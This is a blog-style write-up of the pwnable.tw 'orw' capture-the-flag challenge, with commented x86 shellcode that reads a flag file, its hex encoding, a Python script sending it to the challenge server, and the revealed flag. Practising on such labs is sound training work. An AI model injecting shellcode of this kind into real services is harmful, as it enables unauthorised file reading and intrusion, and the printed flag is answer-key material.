---
layout: post
title: Binary hacking challenge  
---

Binary hacking involves exploiting the subtle vulnerabilities in a binary program in order to get it to perform unintended actions. There are many sites online where you can practice binary hacking. One such site I came across was [www.pwnable.tw](pwnable).

I attempted the orw challenge which is pretty straight forward and requires you to open,read and write the contents of `/home/orw/flag` to STDOUT.
You can use the `nc` utility on Linux to connect pwnble server. It connects to a binary with STDIN to input the assembly code which will reveal the contents of the flag.
Here the system requires Intel x86 assembly instructions.

```
 xor  eax, eax	; clear eax
 mov  al, 5		; set eax=5 for 'open' syscall
 xor  ecx, ecx	; clear ecx. Opens file in read only mode
 xor  edx, edx	; clear edx
 push ecx		; push '\0' on the stack
 push 0x67616c66	; push 'galf' on the stack
 push 0x2f77726f	; push '/wro' on the stack
 push 0x2f656d6f	; push '/eom' on the stack
 push 0x682f2f2f	; push 'h///' on the stack
 mov  ebx, esp		; mov esp into ebx
 int  0x80			; invoke syscall
 mov  ebx, eax		; move eax to ebx. eax contains the file descriptor
 mov  ecx, esp		; move esp to ecx. contents of file will be read on to the stack
 xor  edx, edx		; clear edx 
 mov  dl, 0x30		; set edx=48. read up to 48 characters.
 mov  al, 3			; set eax=3 fo read syscall.
 int  0x80			; invoke syscall 
 mov  ebx, 1		; set ebx=1. Sets STDOUT as file descriptor for write call.
 mov  al, 4			; set eax=4 for write syscall
 int  0x80			; invoke syscall
```
An online assembly tool can be used to obtain the hex code representation. [ Shell Storm ](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)

A simple python script is used to communicate with the challenge server.
```python
import socket

sck = socket.create_connection(('chall.pwnable.tw', 10001))
_ = sck.recv(4096)
print(_)

shellcode="\x31\xc0\xb0\x05\x31\xc9\x31\xd2\x51\x68\x66\x6c\x61\x67\x68\x6f\x72\x77\x2f\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f\x68\x89\xe3\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb2\x30\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\xb0\x04\xcd\x80"
sck.send(shellcode)

print('length',len(shellcode))
res=sck.recv(1024)
print(res)
```

The output contains the flag as follows
```
Give my your shellcode:
('length', 54)
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
```
In summary the binary opens an STDIN which can be used to inject assembly code. The assembly code performs the open,read and write syscalls.